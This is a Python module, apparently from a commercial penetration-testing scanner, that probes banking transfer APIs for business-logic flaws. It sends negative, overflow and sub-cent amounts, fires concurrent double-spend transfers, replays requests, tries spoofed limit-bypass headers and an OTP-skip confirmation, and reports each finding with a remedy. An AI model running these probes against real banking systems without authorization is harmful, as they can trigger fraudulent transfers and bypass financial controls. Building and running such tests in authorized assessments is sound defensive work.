"""
GATOR PRO Enterprise — Module 7: Business Logic Security Engine
════════════════════════════════════════════════════════════════
Banking-specific business logic testing:
  • Transfer limit bypass (negative amounts, overflow)
  • Race conditions on balance checks (concurrent transfers)
  • TOCTOU — time-of-check to time-of-use
  • Negative amount transfers
  • Precision/rounding manipulation (0.001 cent attacks)
  • Idempotency bypass (double-spend via replay)
  • Account balance enumeration
  • Workflow bypass (skip 2FA for transfers)
  • Batch payment manipulation
  • Currency conversion exploitation
  • Loan/credit limit bypass
  • Transaction rollback abuse
"""

import json, re, ssl, time, urllib.request, urllib.error, urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Callable, Optional


TRANSFER_PATHS = [
    "/api/v1/transfers",
    "/api/v1/payments",
    "/api/v1/transactions",
    "/api/v2/transfers",
    "/api/payments",
    "/transfers",
    "/payments",
]

ACCOUNT_PATHS = [
    "/api/v1/accounts/{id}/balance",
    "/api/v1/accounts/{id}",
    "/api/v1/accounts",
    "/api/v1/users/me/accounts",
]


class BizLogicEngine:
    def __init__(self, target: str, scan_id: str, db, push_event: Callable,
                 auth_header: str = None, account_id: str = "1", **kwargs):
        self.target      = self._clean(target)
        self.base_url    = f"https://{self._clean(target)}"
        self.scan_id     = scan_id
        self.db          = db
        self.push_event  = push_event
        self.auth_header = auth_header
        self.account_id  = account_id
        self.findings    = []

    def _clean(self, t):
        return t.replace("https://","").replace("http://","").split("/")[0].split(":")[0].strip()

    def log(self, level, msg, data=None):
        self.push_event(self.db, self.scan_id, "log", level, msg, data or {})

    def finding(self, f):
        self.findings.append(f)
        sev = f.get("severity","info")
        self.push_event(self.db, self.scan_id, "finding", sev,
            f"[{sev.upper()}] {f.get('title','')[:80]}",
            {"severity": sev, "cvss": f.get("cvss",0)})

    def run(self) -> dict:
        self.log("info", f"╔══ BUSINESS LOGIC ══ {self.base_url} ══╗")
        t0 = time.time()

        transfer_url = self._find_transfer_endpoint()
        self._test_negative_amounts(transfer_url)
        self._test_integer_overflow(transfer_url)
        self._test_race_condition(transfer_url)
        self._test_idempotency_bypass(transfer_url)
        self._test_precision_manipulation(transfer_url)
        self._test_limit_bypass(transfer_url)
        self._test_workflow_skip()
        self._test_balance_enumeration()
        self._test_currency_manipulation(transfer_url)

        elapsed = round(time.time() - t0, 1)
        self.log("ok",
            f"╚══ BIZLOGIC DONE {elapsed}s ══ "
            f"Findings: {len(self.findings)} ══╝")
        return {"findings": self.findings}

    def _find_transfer_endpoint(self) -> Optional[str]:
        for path in TRANSFER_PATHS:
            url = self.base_url + path
            r = self._req("GET", url)
            if r and r["status"] in (200, 201, 400, 401, 403, 405, 422):
                self.log("info", f"[BIZ] Transfer endpoint: {url}")
                return url
        return self.base_url + TRANSFER_PATHS[0]

    # ── Negative Amount Transfer ──────────────────────────────
    def _test_negative_amounts(self, transfer_url: str):
        self.log("data","[BIZ] Testing negative amount transfers...")
        if not transfer_url:
            return
        payloads = [
            {"amount": -100.00, "to_account": "9999", "currency": "USD"},
            {"amount": -0.01,   "to_account": "9999", "currency": "USD"},
            {"amount": -999999, "to_account": "9999", "currency": "USD"},
            {"amount": "-100",  "to_account": "9999", "currency": "USD"},
        ]
        for payload in payloads:
            r = self._req("POST", transfer_url, body=json.dumps(payload),
                          ct="application/json")
            if not r:
                continue
            if r["status"] in (200, 201, 202):
                self.log("warn",
                    f"[BIZ] 🚨 Negative amount accepted: {payload['amount']}")
                self.finding({
                    "severity":       "critical",
                    "cvss":           9.8,
                    "owasp_category": "API6:2023-Unrestricted Access to Sensitive Business Flows",
                    "pci_dss_req":    ["6.2.4"],
                    "swift_control":  ["2.9A"],
                    "cwe_ids":        ["CWE-840"],
                    "title":          f"Negative amount transfer accepted: {payload['amount']}",
                    "description":    (
                        f"Transfer endpoint accepted negative amount {payload['amount']}. "
                        "An attacker can send negative transfers to increase own balance "
                        "or drain recipient accounts."),
                    "recommendation": (
                        "1. Validate amount > 0 server-side before processing.\n"
                        "2. Reject negative, zero, and excessively large amounts.\n"
                        "3. Implement atomic balance checks with database transactions.\n"
                        "4. Log all rejected transactions for fraud monitoring."),
                    "evidence":       f"POST {transfer_url} amount={payload['amount']} → HTTP {r['status']}",
                    "poc":            (
                        f"curl -X POST '{transfer_url}' "
                        f"-H 'Content-Type: application/json' "
                        f"-d '{json.dumps(payload)}'"),
                    "host":           self.target,
                    "url":            transfer_url,
                    "tool":           "gator_bizlogic",
                    "category":       "bizlogic",
                })
                break
            else:
                self.log("ok", f"[BIZ] Negative amount rejected ✓ ({r['status']})")
                break

    # ── Integer Overflow ──────────────────────────────────────
    def _test_integer_overflow(self, transfer_url: str):
        self.log("data","[BIZ] Testing integer overflow amounts...")
        if not transfer_url:
            return
        overflow_amounts = [
            2147483647,       # INT32_MAX
            2147483648,       # INT32_MAX + 1
            9223372036854775807,  # INT64_MAX
            9223372036854775808,  # INT64_MAX + 1
            99999999999999999999, # Very large
            0.00000000001,        # Subnormal float
        ]
        for amt in overflow_amounts[:3]:
            payload = {"amount": amt, "to_account": "9999", "currency": "USD"}
            r = self._req("POST", transfer_url, body=json.dumps(payload),
                          ct="application/json")
            if r and r["status"] in (200, 201):
                self.log("warn", f"[BIZ] ⚠️  Overflow amount accepted: {amt}")
                self.finding({
                    "severity":       "high",
                    "cvss":           8.1,
                    "owasp_category": "API6:2023-Unrestricted Access to Sensitive Business Flows",
                    "pci_dss_req":    ["6.2.4"],
                    "cwe_ids":        ["CWE-190"],
                    "title":          f"Integer overflow in transfer amount: {amt}",
                    "description":    "Extremely large amounts accepted may cause integer overflow "
                                     "in backend, resulting in negative or wrapped-around balances.",
                    "recommendation": "Enforce maximum transaction limits. Validate amount within "
                                     "business range (e.g. max 1,000,000 per transaction).",
                    "evidence":       f"Amount {amt} accepted at {transfer_url}",
                    "host":           self.target,
                    "url":            transfer_url,
                    "tool":           "gator_bizlogic",
                    "category":       "bizlogic",
                })
                break

    # ── Race Condition (Concurrent Transfers) ─────────────────
    def _test_race_condition(self, transfer_url: str):
        self.log("data","[BIZ] Testing race condition on balance check...")
        if not transfer_url:
            return
        # Send 10 simultaneous transfers for same amount
        # If balance check is not atomic, multiple may succeed
        payload = {"amount": 1.00, "to_account": "attacker_acc", "currency": "USD"}
        body    = json.dumps(payload)
        results = []

        def do_transfer():
            r = self._req("POST", transfer_url, body=body, ct="application/json")
            return r["status"] if r else None

        with ThreadPoolExecutor(max_workers=10) as ex:
            futs = [ex.submit(do_transfer) for _ in range(10)]
            for f in as_completed(futs):
                results.append(f.result())

        success_count = results.count(200) + results.count(201) + results.count(202)
        if success_count > 1:
            self.log("warn",
                f"[BIZ] 🚨 Race condition: {success_count}/10 concurrent transfers succeeded!")
            self.finding({
                "severity":       "critical",
                "cvss":           9.1,
                "owasp_category": "API6:2023-Unrestricted Access to Sensitive Business Flows",
                "pci_dss_req":    ["6.2.4"],
                "swift_control":  ["2.9A"],
                "cwe_ids":        ["CWE-362"],
                "title":          f"Race condition on balance check — {success_count} concurrent transfers succeeded",
                "description":    (
                    f"{success_count} out of 10 simultaneous transfer requests succeeded. "
                    "Non-atomic balance check allows double-spend via race condition. "
                    "An attacker can drain more than their balance by racing multiple transfers."),
                "recommendation": (
                    "1. Use database-level transactions with SELECT FOR UPDATE.\n"
                    "2. Implement optimistic locking with version numbers.\n"
                    "3. Use idempotency keys to deduplicate concurrent requests.\n"
                    "4. Queue transfers through a serialized processing pipeline."),
                "evidence":       f"10 concurrent POST {transfer_url} → {success_count} HTTP 2xx",
                "host":           self.target,
                "url":            transfer_url,
                "tool":           "gator_bizlogic",
                "category":       "bizlogic",
            })
        else:
            self.log("ok", f"[BIZ] Race condition: only {success_count} succeeded ✓")

    # ── Idempotency / Replay Attack ───────────────────────────
    def _test_idempotency_bypass(self, transfer_url: str):
        self.log("data","[BIZ] Testing idempotency (replay attack)...")
        if not transfer_url:
            return
        payload = {
            "amount": 1.00,
            "to_account": "9999",
            "currency": "USD",
            "reference": "GATOR-TEST-REPLAY-001",
        }
        body = json.dumps(payload)
        # Send same request twice with same reference
        r1 = self._req("POST", transfer_url, body=body, ct="application/json")
        r2 = self._req("POST", transfer_url, body=body, ct="application/json")
        if r1 and r2 and r1["status"] in (200,201) and r2["status"] in (200,201):
            # Check if transaction IDs differ (double-spend)
            try:
                d1 = json.loads(r1["body"])
                d2 = json.loads(r2["body"])
                id1 = d1.get("id") or d1.get("transactionId") or d1.get("transfer_id")
                id2 = d2.get("id") or d2.get("transactionId") or d2.get("transfer_id")
                if id1 and id2 and id1 != id2:
                    self.log("warn", f"[BIZ] 🚨 Idempotency bypass: same reference = 2 transactions!")
                    self.finding({
                        "severity":       "critical",
                        "cvss":           9.1,
                        "owasp_category": "API6:2023-Unrestricted Access to Sensitive Business Flows",
                        "swift_control":  ["2.9A"],
                        "cwe_ids":        ["CWE-294"],
                        "title":          "Replay attack / idempotency bypass on transfers",
                        "description":    "Same transfer reference processed twice, creating two separate transactions.",
                        "recommendation": (
                            "1. Implement idempotency keys — deduplicate by reference/key.\n"
                            "2. Return same result for duplicate requests within time window.\n"
                            "3. Store processed reference IDs in database with TTL."),
                        "evidence":       f"Same reference processed twice: txn1={id1}, txn2={id2}",
                        "host":           self.target,
                        "url":            transfer_url,
                        "tool":           "gator_bizlogic",
                        "category":       "bizlogic",
                    })
            except (json.JSONDecodeError, KeyError):
                pass

    # ── Precision Manipulation ────────────────────────────────
    def _test_precision_manipulation(self, transfer_url: str):
        self.log("data","[BIZ] Testing floating-point precision manipulation...")
        if not transfer_url:
            return
        # Salami attack: many tiny transfers < minimum fee threshold
        micro_amounts = [0.001, 0.0001, 0.0000001, 0.005]
        for amount in micro_amounts:
            payload = {"amount": amount, "to_account": "9999", "currency": "USD"}
            r = self._req("POST", transfer_url, body=json.dumps(payload),
                          ct="application/json")
            if r and r["status"] in (200, 201):
                self.log("warn", f"[BIZ] ⚠️  Micro-amount accepted: {amount}")
                self.finding({
                    "severity":       "medium",
                    "cvss":           5.4,
                    "owasp_category": "API6:2023-Unrestricted Access to Sensitive Business Flows",
                    "cwe_ids":        ["CWE-681"],
                    "title":          f"Micro-transaction accepted: {amount} (Salami attack)",
                    "description":    "Sub-cent transactions accepted. Enables salami slicing attacks "
                                     "— aggregating thousands of tiny charges below detection threshold.",
                    "recommendation": "Enforce minimum transaction amount. Round to 2 decimal places.",
                    "evidence":       f"Amount {amount} accepted",
                    "host":           self.target,
                    "url":            transfer_url,
                    "tool":           "gator_bizlogic",
                    "category":       "bizlogic",
                })
                break

    # ── Transfer Limit Bypass ─────────────────────────────────
    def _test_limit_bypass(self, transfer_url: str):
        self.log("data","[BIZ] Testing transfer limit bypass techniques...")
        if not transfer_url:
            return
        # Try to bypass limits via parameter manipulation
        bypass_payloads = [
            {"amount": 999999.99, "to_account": "9999", "currency": "USD"},
            {"amount": 1000000,   "to_account": "9999", "currency": "USD"},
            # Header bypass attempts
        ]
        bypass_headers = [
            {"X-Internal-User": "true"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Admin": "true"},
            {"X-Bypass-Limits": "true"},
            {"X-VIP-Customer": "true"},
        ]
        for payload in bypass_payloads[:2]:
            for extra_h in bypass_headers:
                headers = {"Content-Type": "application/json"}
                headers.update(extra_h)
                if self.auth_header:
                    headers["Authorization"] = self.auth_header
                r = self._req("POST", transfer_url,
                              body=json.dumps(payload), headers=headers)
                if r and r["status"] in (200, 201):
                    self.log("warn",
                        f"[BIZ] ⚠️  Limit bypass with header {extra_h}: "
                        f"amount {payload['amount']} accepted")
                    self.finding({
                        "severity":       "high",
                        "cvss":           7.5,
                        "owasp_category": "API5:2023-Broken Function Level Authorization",
                        "swift_control":  ["2.9A"],
                        "title":          f"Transfer limit bypass via HTTP header: {list(extra_h.keys())[0]}",
                        "description":    f"Large transfer of {payload['amount']} accepted when "
                                         f"header {extra_h} present. Header-based limit bypass.",
                        "recommendation": "Never use client-supplied headers for security decisions. "
                                         "Enforce limits server-side based on authenticated user role.",
                        "evidence":       f"Header {extra_h} bypasses transfer limit",
                        "host":           self.target,
                        "url":            transfer_url,
                        "tool":           "gator_bizlogic",
                        "category":       "bizlogic",
                    })
                    break

    # ── Workflow Skip ─────────────────────────────────────────
    def _test_workflow_skip(self):
        self.log("data","[BIZ] Testing workflow bypass (skip 2FA for transfers)...")
        # Look for multi-step transfer workflow
        # Step 1: initiate transfer → get token
        # Step 2: confirm with OTP
        # Bypass: try to confirm without step 1, or skip step 2
        for path in TRANSFER_PATHS:
            confirm_url = self.base_url + path + "/confirm"
            r = self._req("POST", confirm_url,
                body=json.dumps({"transfer_id": "12345", "otp": "000000"}),
                ct="application/json")
            if r and r["status"] not in (404,):
                self.log("info", f"[BIZ] Transfer confirmation endpoint: {confirm_url}")
                if r["status"] in (200, 201):
                    self.finding({
                        "severity":       "critical",
                        "cvss":           9.1,
                        "owasp_category": "API6:2023-Unrestricted Access to Sensitive Business Flows",
                        "swift_control":  ["5.4"],
                        "pci_dss_req":    ["8.4.2"],
                        "title":          "Transfer workflow bypass — confirmation skippable",
                        "description":    "Transfer can be confirmed without valid OTP or prior initiation step.",
                        "recommendation": "Enforce strict workflow state machine. Each step validates previous.",
                        "evidence":       f"POST {confirm_url} with test OTP → HTTP {r['status']}",
                        "host":           self.target,
                        "url":            confirm_url,
                        "tool":           "gator_bizlogic",
                        "category":       "bizlogic",
                    })
                break

    # ── Balance Enumeration ───────────────────────────────────
    def _test_balance_enumeration(self):
        self.log("data","[BIZ] Testing account balance enumeration via timing...")
        for path_tmpl in ACCOUNT_PATHS:
            for test_id in ["1","2","3","99999"]:
                path = path_tmpl.replace("{id}", test_id)
                url  = self.base_url + path
                t0 = time.time()
                r = self._req("GET", url)
                elapsed = time.time() - t0
                if r and r["status"] == 200:
                    body = r["body"]
                    # Check if balance is exposed without masking
                    bal_pattern = r'"(?:balance|availableBalance|currentBalance)"\s*:\s*(\d+\.?\d*)'
                    m = re.search(bal_pattern, body, re.IGNORECASE)
                    if m and float(m.group(1)) > 0:
                        self.log("warn", f"[BIZ] Balance exposed: {m.group(1)} at {url}")
                        self.finding({
                            "severity":       "medium",
                            "cvss":           5.3,
                            "owasp_category": "API3:2023-Broken Object Property Level Authorization",
                            "pci_dss_req":    ["7.3.1"],
                            "title":          f"Account balance exposed to unauthenticated request",
                            "description":    f"Balance {m.group(1)} returned without authentication at {url}.",
                            "recommendation": "Require authentication for all balance endpoints. Verify ownership.",
                            "evidence":       f"GET {url} → balance: {m.group(1)}",
                            "host":           self.target,
                            "url":            url,
                            "tool":           "gator_bizlogic",
                            "category":       "bizlogic",
                        })
                        return

    # ── Currency Manipulation ─────────────────────────────────
    def _test_currency_manipulation(self, transfer_url: str):
        self.log("data","[BIZ] Testing currency manipulation...")
        if not transfer_url:
            return
        # Try sending in low-value currency, receiving in high-value
        payloads = [
            {"amount": 1000, "from_currency": "UZS", "to_currency": "USD", "to_account": "9999"},
            {"amount": 1000, "currency": "UZS", "to_account": "9999"},
            {"amount": 1, "currency": "INVALID", "to_account": "9999"},
        ]
        for payload in payloads:
            r = self._req("POST", transfer_url, body=json.dumps(payload),
                          ct="application/json")
            if r and r["status"] in (200, 201):
                body = r["body"].lower()
                if "usd" in body or "eur" in body:
                    self.log("warn", "[BIZ] ⚠️  Currency confusion possible")
                    self.finding({
                        "severity":       "high",
                        "cvss":           7.5,
                        "owasp_category": "API6:2023-Unrestricted Access to Sensitive Business Flows",
                        "swift_control":  ["2.9A"],
                        "title":          "Currency manipulation — cross-currency arbitrage possible",
                        "description":    "Transfer API may process amount in different currency than specified.",
                        "recommendation": "Validate currency codes. Use ISO 4217. Verify FX rate from trusted source.",
                        "evidence":       f"Payload with {payload.get('currency','?')} → response contains USD/EUR",
                        "host":           self.target,
                        "url":            transfer_url,
                        "tool":           "gator_bizlogic",
                        "category":       "bizlogic",
                    })
                    break

    # ─── HTTP helper ─────────────────────────────────────────
    def _req(self, method, url, body=None, ct=None,
             headers=None) -> Optional[dict]:
        try:
            data = body.encode() if body else None
            req  = urllib.request.Request(url, data=data, method=method)
            req.add_header("User-Agent","GATOR-PRO/2.0")
            req.add_header("Accept","application/json,*/*")
            if ct:
                req.add_header("Content-Type", ct)
            if self.auth_header:
                req.add_header("Authorization", self.auth_header)
            if headers:
                for k, v in headers.items():
                    req.add_header(k, v)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with urllib.request.urlopen(req, context=ctx, timeout=8) as resp:
                rb = resp.read(16384).decode("utf-8","ignore")
                return {"status":resp.status,"headers":dict(resp.headers),"body":rb}
        except urllib.error.HTTPError as e:
            b = ""
            try: b = e.read(4096).decode("utf-8","ignore")
            except: pass
            return {"status":e.code,"headers":dict(e.headers),"body":b}
        except Exception:
            return None
